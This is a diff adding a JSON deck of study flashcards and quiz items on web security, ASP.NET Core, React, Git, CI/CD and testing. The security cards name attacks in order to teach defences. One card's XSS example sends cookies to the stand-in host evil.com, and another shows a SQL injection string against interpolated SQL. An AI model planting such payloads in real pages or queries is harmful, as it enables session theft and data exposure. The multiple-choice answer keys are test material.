@@ -1,0 +1,226 @@
+[
+  {
+    "card_id": "SEC-AUTH-001",
+    "front": "What is the difference between authentication and authorization?",
+    "back": "AUTHENTICATION: Verifying WHO you are\n- \"Are you really John?\"\n- Proves identity (username/password, biometrics, tokens)\n\nAUTHORIZATION: Verifying WHAT you can access\n- \"Can John access this resource?\"\n- Determines permissions/roles after authentication\n\nOrder: Authentication FIRST, then Authorization",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "authentication"
+  },
+  {
+    "card_id": "SEC-AUTH-002",
+    "front": "Why should you NEVER store passwords in plain text?",
+    "back": "If database is breached:\n- Attacker gets ALL passwords instantly\n- Users often reuse passwords across sites\n- Legal/GDPR violations\n\nCORRECT approach:\n1. Hash password with bcrypt/Argon2\n2. Use unique salt per password\n3. Store only the hash + salt\n4. On login: hash input, compare hashes",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "authentication"
+  },
+  {
+    "card_id": "SEC-AUTH-MCQ-001",
+    "front": "Which password storage approach is secure?",
+    "back": "{\"options\": [\"Store password encrypted with AES\", \"Store password hashed with bcrypt + unique salt\", \"Store password hashed with MD5\", \"Store password in base64 encoding\"], \"correct\": 1, \"multi_select\": false, \"explanation\": \"bcrypt with unique salt is secure. MD5 is broken, AES is reversible, base64 is encoding not encryption.\"}",
+    "atom_type": "mcq",
+    "course": "CDS.Security",
+    "topic": "authentication"
+  },
+  {
+    "card_id": "SEC-SESSION-001",
+    "front": "Why is storing raw user ID in a cookie INSECURE?",
+    "back": "VULNERABILITY: Cookie forgery / session hijacking\n\nIf cookie contains: userId=abc-123-def\n\nAttacker can:\n1. Guess/find another user's GUID\n2. Create cookie: userId=other-user-guid\n3. Impersonate that user completely\n\nFIX: Use SIGNED cookies or JWT\n- Server signs cookie with secret key\n- Tampering detected on each request\n- ASP.NET: HttpContext.SignInAsync()",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "session"
+  },
+  {
+    "card_id": "SEC-SESSION-002",
+    "front": "What is the difference between session-based auth and JWT?",
+    "back": "SESSION-BASED (Cookie Auth):\n- Server stores session data\n- Cookie contains session ID only\n- Stateful (server must track sessions)\n- Easy to invalidate (delete server session)\n\nJWT (Token Auth):\n- Token contains all user data (signed)\n- Server is stateless\n- Self-contained (no server lookup)\n- Hard to invalidate before expiry\n\nChoose session for: traditional web apps\nChoose JWT for: APIs, microservices, mobile",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "session"
+  },
+  {
+    "card_id": "SEC-SESSION-003",
+    "front": "In ASP.NET Core, what is the CORRECT way to sign in a user?",
+    "back": "WRONG (insecure):\nResponse.Cookies.Append(\"userId\", user.Id.ToString());\n\nCORRECT (signed cookie):\nvar claims = new List<Claim> {\n    new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),\n    new Claim(ClaimTypes.Name, user.Username)\n};\nvar identity = new ClaimsIdentity(claims, \"Cookies\");\nvar principal = new ClaimsPrincipal(identity);\n\nawait HttpContext.SignInAsync(principal);\n\nThe framework signs the cookie cryptographically.",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "session"
+  },
+  {
+    "card_id": "SEC-SESSION-MCQ-001",
+    "front": "Which approach provides secure session management in ASP.NET Core?",
+    "back": "{\"options\": [\"Response.Cookies.Append(\\\"userId\\\", id)\", \"HttpContext.SignInAsync() with ClaimsPrincipal\", \"Storing user ID in localStorage\", \"Passing user ID in query string\"], \"correct\": 1, \"multi_select\": false, \"explanation\": \"SignInAsync creates cryptographically signed cookies. Raw cookies, localStorage, and query strings are insecure.\"}",
+    "atom_type": "mcq",
+    "course": "CDS.Security",
+    "topic": "session"
+  },
+  {
+    "card_id": "SEC-ATTACK-001",
+    "front": "What is IDOR (Insecure Direct Object Reference)?",
+    "back": "IDOR: Accessing resources by manipulating IDs without authorization check.\n\nExample vulnerable endpoint:\nGET /api/orders/123  -> Returns order 123\n\nAttack:\nUser changes 123 to 124 in URL\nGets ANOTHER user's order data!\n\nFIX: Always verify ownership\nif (order.UserId != currentUser.Id)\n    return Forbid();",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "web_security"
+  },
+  {
+    "card_id": "SEC-ATTACK-002",
+    "front": "What is SQL Injection and how do you prevent it?",
+    "back": "SQL INJECTION: Malicious SQL in user input\n\nVulnerable code:\n$\"SELECT * FROM Users WHERE name = '{input}'\"\n\nAttack input: ' OR '1'='1\nResult: Returns ALL users!\n\nPREVENTION:\n1. NEVER concatenate user input into SQL\n2. Use parameterized queries:\n   cmd.Parameters.AddWithValue(\"@name\", input)\n3. Use ORM (Entity Framework)\n4. Input validation (but not sufficient alone)",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "web_security"
+  },
+  {
+    "card_id": "SEC-ATTACK-003",
+    "front": "What is XSS (Cross-Site Scripting)?",
+    "back": "XSS: Injecting malicious scripts into web pages\n\nTypes:\n1. Stored XSS: Script saved in database, served to all users\n2. Reflected XSS: Script in URL parameter, executed immediately\n3. DOM XSS: Client-side script manipulation\n\nExample attack:\n<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\nPREVENTION:\n- Escape/encode output (HTML entities)\n- Content Security Policy (CSP)\n- HttpOnly cookies (JS can't read)\n- Input validation",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "web_security"
+  },
+  {
+    "card_id": "SEC-ATTACK-MCQ-001",
+    "front": "Which code is vulnerable to SQL injection?",
+    "back": "{\"options\": [\"ctx.Users.Where(u => u.Name == input)\", \"cmd.Parameters.AddWithValue(\\\"@n\\\", input)\", \"$\\\"SELECT * FROM Users WHERE name = '{input}'\\\"\", \"await ctx.Users.FindAsync(id)\"], \"correct\": 2, \"multi_select\": false, \"explanation\": \"String interpolation in SQL is vulnerable. EF queries and parameterized queries are safe.\"}",
+    "atom_type": "mcq",
+    "course": "CDS.Security",
+    "topic": "web_security"
+  },
+  {
+    "card_id": "SEC-DOCKER-001",
+    "front": "What is the difference between a Docker image and a container?",
+    "back": "IMAGE:\n- Blueprint/template\n- Read-only\n- Built from Dockerfile\n- Can be shared (Docker Hub)\n\nCONTAINER:\n- Running instance of an image\n- Has state (can write)\n- Isolated process\n- Created with 'docker run'\n\nAnalogy:\nImage = Class definition\nContainer = Object instance",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "docker"
+  },
+  {
+    "card_id": "SEC-DOCKER-002",
+    "front": "What is the purpose of a multi-stage Dockerfile?",
+    "back": "MULTI-STAGE BUILD:\nReduces final image size by separating build and runtime.\n\n# Stage 1: Build\nFROM node:18 AS build\nWORKDIR /app\nCOPY . .\nRUN npm ci && npm run build\n\n# Stage 2: Runtime (smaller!)\nFROM nginx:alpine\nCOPY --from=build /app/dist /usr/share/nginx/html\n\nBenefits:\n- Build tools not in final image\n- Smaller attack surface\n- Faster deployments",
+    "atom_type": "flashcard",
+    "course": "CDS.Security",
+    "topic": "docker"
+  },
+  {
+    "card_id": "PROG-REACT-001",
+    "front": "What is the difference between props and state in React?",
+    "back": "PROPS:\n- Passed FROM parent TO child\n- Read-only (immutable)\n- Used for component configuration\n- Changes trigger re-render\n\nSTATE:\n- Managed WITHIN component\n- Mutable (via useState setter)\n- Used for dynamic data\n- Changes trigger re-render\n\nRule: Props flow DOWN, state is LOCAL",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "react"
+  },
+  {
+    "card_id": "PROG-REACT-002",
+    "front": "When does useEffect run?",
+    "back": "useEffect(() => { ... }, dependencies)\n\nDependencies array controls when:\n\n[] (empty): Run ONCE on mount only\n[value]: Run on mount AND when 'value' changes\nundefined: Run on EVERY render (usually wrong!)\n\nCleanup function runs:\n- Before next effect execution\n- On component unmount\n\nuseEffect(() => {\n  const sub = subscribe();\n  return () => sub.unsubscribe(); // cleanup\n}, []);",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "react"
+  },
+  {
+    "card_id": "PROG-REACT-003",
+    "front": "What is Jotai and why use it over useState?",
+    "back": "JOTAI: Global state management library\n\nProblem with useState:\n- State is component-local\n- Sharing requires \"prop drilling\"\n- Complex for cross-component state\n\nJotai solution:\n// Create atom (global state)\nconst countAtom = atom(0);\n\n// Use in ANY component\nconst [count, setCount] = useAtom(countAtom);\n\nBenefits:\n- No prop drilling\n- Simple API (like useState)\n- Automatic re-renders\n- Derived atoms for computed state",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "react"
+  },
+  {
+    "card_id": "PROG-EF-001",
+    "front": "What is Entity Framework scaffolding (reverse engineering)?",
+    "back": "SCAFFOLDING: Generate C# classes from existing database\n\nCommand:\ndotnet ef dbcontext scaffold \"connection_string\" \\\n  Npgsql.EntityFrameworkCore.PostgreSQL \\\n  --context MyDbContext \\\n  --schema myschema\n\nGenerates:\n1. Entity classes (one per table)\n2. DbContext with DbSet<T> properties\n3. Relationships (navigation properties)\n\nUse when: Database-first development\nAlternative: Code-first with migrations",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "entity_framework"
+  },
+  {
+    "card_id": "PROG-EF-002",
+    "front": "What is Dependency Injection and why use it?",
+    "back": "DI: Providing dependencies from OUTSIDE rather than creating inside.\n\nWITHOUT DI (tight coupling):\npublic class OrderService {\n    private readonly DbContext _ctx = new DbContext(); // BAD\n}\n\nWITH DI (loose coupling):\npublic class OrderService {\n    private readonly DbContext _ctx;\n    public OrderService(DbContext ctx) => _ctx = ctx; // GOOD\n}\n\n// Register in Program.cs:\nbuilder.Services.AddScoped<OrderService>();\n\nBenefits:\n- Testable (inject mock)\n- Configurable\n- Single Responsibility",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "dotnet"
+  },
+  {
+    "card_id": "PROG-DTO-001",
+    "front": "What is a DTO and why use separate DTOs for requests/responses?",
+    "back": "DTO = Data Transfer Object\n\nPurpose: Shape data for specific use cases\n\nEntity (database model):\n- All columns including sensitive ones\n- Navigation properties\n- Internal IDs\n\nCreateDto (request):\n- Only fields user should provide\n- Validation attributes\n- No ID (server generates)\n\nResponseDto:\n- Only fields client needs\n- No sensitive data\n- Computed/formatted fields\n\nPrevents: Over-posting, data leakage, circular refs",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "dotnet"
+  },
+  {
+    "card_id": "PROG-VALID-001",
+    "front": "How do you add server-side validation in ASP.NET Core?",
+    "back": "Use Data Annotations on DTOs:\n\npublic class CreatePetDto\n{\n    [Required]\n    [MinLength(3)]\n    public string Name { get; set; }\n\n    [Range(0, 15)]\n    public int Age { get; set; }\n\n    [EmailAddress]\n    public string OwnerEmail { get; set; }\n}\n\nIn controller:\n[HttpPost]\npublic IActionResult Create(CreatePetDto dto)\n{\n    if (!ModelState.IsValid)\n        return BadRequest(ModelState);\n    // ...\n}\n\nAutomatic validation with [ApiController] attribute.",
+    "atom_type": "flashcard",
+    "course": "PROGII",
+    "topic": "dotnet"
+  },
+  {
+    "card_id": "SDE-GIT-001",
+    "front": "What is a Git Pull Request (PR)?",
+    "back": "PULL REQUEST: Request to merge one branch into another\n\nWorkflow:\n1. Create feature branch\n2. Make commits\n3. Push to remote\n4. Open PR (GitHub/GitLab)\n5. Code review by team\n6. Merge after approval\n\nBenefits:\n- Code review before merge\n- Discussion on changes\n- CI/CD can run tests\n- History of decisions",
+    "atom_type": "flashcard",
+    "course": "SDE2",
+    "topic": "git"
+  },
+  {
+    "card_id": "SDE-GIT-002",
+    "front": "What is GitHub Flow?",
+    "back": "GITHUB FLOW: Simple branching strategy\n\nRules:\n1. main branch is ALWAYS deployable\n2. Create branch FROM main for features\n3. Commit to feature branch\n4. Open PR when ready\n5. After review + tests pass → merge\n6. Deploy immediately after merge\n\nvs Git Flow:\n- Simpler (no develop, release branches)\n- Continuous deployment friendly\n- Best for web apps with frequent releases",
+    "atom_type": "flashcard",
+    "course": "SDE2",
+    "topic": "git"
+  },
+  {
+    "card_id": "SDE-CICD-001",
+    "front": "What is the difference between CI and CD?",
+    "back": "CI (Continuous Integration):\n- Merge code frequently (daily+)\n- Automated build on each push\n- Automated tests run\n- Fast feedback on breakage\n\nCD (Continuous Delivery):\n- Code always in deployable state\n- Automated deployment to staging\n- Manual approval for production\n\nCD (Continuous Deployment):\n- Every passing build auto-deploys\n- No manual approval\n- Requires excellent test coverage",
+    "atom_type": "flashcard",
+    "course": "SDE2",
+    "topic": "cicd"
+  },
+  {
+    "card_id": "SDE-CICD-002",
+    "front": "What is a GitHub Actions workflow?",
+    "back": "WORKFLOW: Automated process defined in YAML\n\nLocation: .github/workflows/ci.yml\n\nname: CI\non: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm test\n\nKey concepts:\n- Triggers (on): push, PR, schedule\n- Jobs: run in parallel by default\n- Steps: sequential within a job\n- Actions: reusable steps",
+    "atom_type": "flashcard",
+    "course": "SDE2",
+    "topic": "cicd"
+  },
+  {
+    "card_id": "SDE-HOOKS-001",
+    "front": "What are Git hooks and what is Husky?",
+    "back": "GIT HOOKS: Scripts that run on Git events\n\nCommon hooks:\n- pre-commit: Before commit is created\n- commit-msg: Validate commit message\n- pre-push: Before push to remote\n\nHUSKY: Tool to manage Git hooks easily\n\nSetup:\nnpx husky init\necho \"npm test\" > .husky/pre-commit\n\nUse with lint-staged:\n- Only lint/format STAGED files\n- Faster than checking everything",
+    "atom_type": "flashcard",
+    "course": "SDE2",
+    "topic": "git_hooks"
+  },
+  {
+    "card_id": "TEST-UNIT-001",
+    "front": "What is the 3A pattern in unit testing?",
+    "back": "3A PATTERN: Arrange, Act, Assert\n\n[Fact]\npublic void CreatePet_ValidInput_ReturnsPet()\n{\n    // ARRANGE - Set up test data\n    var dto = new CreatePetDto { Name = \"Rex\", Age = 3 };\n    var service = new PetService(mockDb);\n\n    // ACT - Execute the method\n    var result = service.Create(dto);\n\n    // ASSERT - Verify outcome\n    Assert.Equal(\"Rex\", result.Name);\n    Assert.NotNull(result.Id);\n}\n\nKeep each section focused and minimal.",
+    "atom_type": "flashcard",
+    "course": "SDE2.Testing",
+    "topic": "unit_testing"
+  },
+  {
+    "card_id": "TEST-CONTAINER-001",
+    "front": "What is TestContainers and why use it?",
+    "back": "TESTCONTAINERS: Spin up real Docker containers for tests\n\nProblem: Testing with real database\n- SQLite differs from Postgres\n- In-memory mocks miss edge cases\n- Shared test DB causes flaky tests\n\nSolution:\nvar container = new PostgreSqlBuilder().Build();\nawait container.StartAsync();\nvar connectionString = container.GetConnectionString();\n\nBenefits:\n- Real database behavior\n- Isolated per test\n- Same as production\n- Auto-cleanup after tests",
+    "atom_type": "flashcard",
+    "course": "SDE2.Testing",
+    "topic": "integration_testing"
+  },
+  {
+    "card_id": "TEST-DI-001",
+    "front": "How do you use Dependency Injection in xUnit tests?",
+    "back": "Use Xunit.DependencyInjection package:\n\n// Startup.cs in test project\npublic class Startup\n{\n    public void ConfigureServices(IServiceCollection services)\n    {\n        Program.ConfigureServices(services); // Reuse app config\n\n        // Replace DbContext with test container\n        services.RemoveAll(typeof(MyDbContext));\n        services.AddScoped<MyDbContext>(provider => {\n            var container = new PostgreSqlBuilder().Build();\n            container.StartAsync().Wait();\n            // ... setup context\n        });\n    }\n}\n\n// Test class receives dependencies via constructor\npublic class PetTests(PetService service)\n{\n    [Fact]\n    public void Test() => Assert.NotNull(service);\n}",
+    "atom_type": "flashcard",
+    "course": "SDE2.Testing",
+    "topic": "integration_testing"
+  }
+]
